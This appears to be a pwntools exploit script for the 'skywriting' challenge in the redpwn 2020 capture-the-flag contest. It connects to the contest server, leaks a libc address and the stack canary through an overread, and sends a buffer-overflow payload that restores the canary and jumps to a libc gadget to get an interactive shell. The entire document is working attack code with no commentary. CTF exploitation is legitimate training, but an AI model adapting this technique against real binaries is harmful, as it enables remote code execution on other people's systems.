from pwn import *

#p = process('./skywriting')
p = remote('2020.redpwnc.tf', 31034)
e = ELF('./skywriting')
l = e.libc

p.sendlineafter('?', '1')
p.sendafter(': ', '1'*8)

libc = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x61a710
print hex(libc)

p.sendafter(': ', '1'*0x89)
p.recvuntil('1'*0x88)

can = u64(p.recv(8))-0x31
print hex(can)

prdi = libc + 0x000000000002155f

pay = 'notflag{a_cloud_is_just_someone_elses_computer}\n\x00'
pay = pay.ljust(0x88, 'a')
pay += p64(can)+'a'*8+p64(libc+0x10a38c)
pay = pay.ljust(0x200, '\x00')

p.sendafter(': ', pay)

p.interactive()
